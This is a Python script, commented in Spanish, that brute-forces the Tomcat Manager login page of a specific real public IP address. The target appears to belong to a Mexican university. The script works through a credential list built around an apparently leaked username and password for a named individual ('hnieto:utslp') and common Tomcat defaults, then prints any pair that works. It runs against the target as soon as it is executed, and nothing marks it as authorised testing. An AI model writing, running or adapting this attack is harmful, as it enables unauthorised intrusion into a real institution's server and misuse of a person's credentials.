import requests
import base64

class TomcatManagerBruteForcer:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
    
    def brute_force_manager(self):
        """Fuerza bruta del Tomcat Manager usando variaciones de las credenciales SITO"""
        print("[+] Fuerza bruta del Tomcat Manager...")
        
        # Basado en hnieto:utslp, probar variaciones
        credentials = [
            # Credenciales SITO
            ('hnieto', 'utslp'),
            
            # Variaciones del username
            ('hnieto', 'admin'),
            ('hnieto', 'tomcat'),
            ('hnieto', 'manager'),
            ('hnieto', 'password'),
            
            # Variaciones del password  
            ('admin', 'utslp'),
            ('tomcat', 'utslp'),
            ('manager', 'utslp'),
            ('root', 'utslp'),
            
            # Combinaciones comunes de Tomcat
            ('admin', 'admin'),
            ('tomcat', 'tomcat'),
            ('manager', 'manager'),
            ('both', 'tomcat'),
            ('role1', 'role1'),
            
            # Basado en el dominio
            ('hnieto', 'utslp.edu.mx'),
            ('admin', 'utslp.edu.mx'),
            ('sito', 'sito'),
            
            # Otras combinaciones
            ('hnieto', 'hnieto123'),
            ('hnieto', 'Hnieto123'),
            ('hnieto', 'Hnieto@123')
        ]
        
        for username, password in credentials:
            try:
                url = f"{self.target}/manager/html"
                response = self.session.get(url, auth=(username, password), timeout=5)
                
                if response.status_code == 200 and 'Tomcat Web Application Manager' in response.text:
                    print(f"🎉 TOMCAT MANAGER ACCESIBLE: {username}:{password}")
                    return (username, password)
                else:
                    print(f"❌ Falló: {username}:{password}")
                    
            except Exception as e:
                print(f"❌ Error: {username}:{password} - {e}")
        
        print("❌ No se encontraron credenciales para el Manager")
        return None

# Ejecutar
brute_forcer = TomcatManagerBruteForcer("http://189.254.143.102")
brute_forcer.brute_force_manager()